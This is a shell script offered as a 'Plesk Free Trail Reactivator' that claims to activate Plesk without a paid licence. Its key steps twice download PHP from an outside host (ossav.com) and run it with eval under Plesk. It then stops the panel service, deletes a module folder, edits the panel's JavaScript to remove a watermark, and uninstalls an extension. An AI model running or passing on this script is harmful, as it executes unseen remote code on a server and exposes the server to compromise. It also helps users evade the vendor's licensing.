echo " ____  _     _____ ____  _  __  ____   ____ ____  ___ ____ _____ "
echo "|  _ \| |   | ____/ ___|| |/ / / ___| / ___|  _ \|_ _|  _ \_   _|"
echo "| |_) | |   |  _| \___ \| ' /  \___ \| |   | |_) || || |_) || |  "
echo "|  __/| |___| |___ ___) | . \   ___) | |___|  _ < | ||  __/ | |  "
echo "|_|   |_____|_____|____/|_|\_\ |____/ \____|_| \_\___|_|    |_|"
echo ""
echo " ____  _____    _    ____ _____ _____     ___  _____ ___  ____  "
echo "|  _ \| ____|  / \  / ___|_   _|_ _\ \   / / \|_   _/ _ \|  _ \ "
echo "| |_) |  _|   / _ \| |     | |  | | \ \ / / _ \ | || | | | |_) |"
echo "|  _ <| |___ / ___ \ |___  | |  | |  \ V / ___ \| || |_| |  _ < "
echo "|_| \_\_____/_/   \_\____| |_| |___|  \_/_/   \_\_| \___/|_| \_\"
echo "*******************************"
echo "Plesk Free Trail Reactivator"
echo "Script by Trisout"
echo "*******************************"
echo "For support contact me on discord"
sleep 10
echo "Activating Plesk..."
plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
sleep 5
plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
sleep 5
echo "Patching Plesk..."
sleep 1
echo "Stopping Plesk..."
sleep 1
systemctl stop psa
echo "Plesk Stopped"
sleep 1
echo "Removing Module Folder"
sleep 1
rm -rf /usr/local/psa/admin/htdocs/modules/OsSav
echo "Module Folder Removed"
sleep 1
echo "Removing WaterMark..."
sleep 1
fichier="/opt/psa/admin/cp/public/javascript/main.js"
if [ -e "$fichier" ]; then
    sed -i '/\/\*\* OsSav v1\.98 \*\*\//,/\/\*\* Fin de OsSav v1\.98 \*\*\//d' "$fichier"
    echo "Removed WaterMark"
else
    echo "An Error has occured when removing WaterMark. Please Relaunch the script or contact me"
fi
sleep 1
echo "Restaring Plesk..."
sleep 1
systemctl start psa
echo "Plesk restarted"
sleep 1
echo "Removing Ossav Plesk Extention..."
sleep 1
plesk bin extension --uninstall OsSav
echo "Ossav Plesk Extention Removed"
echo "***************************************************************"
echo "Your Plesk is now activated"
echo "Contact me if a error has occured"
echo "***************************************************************"
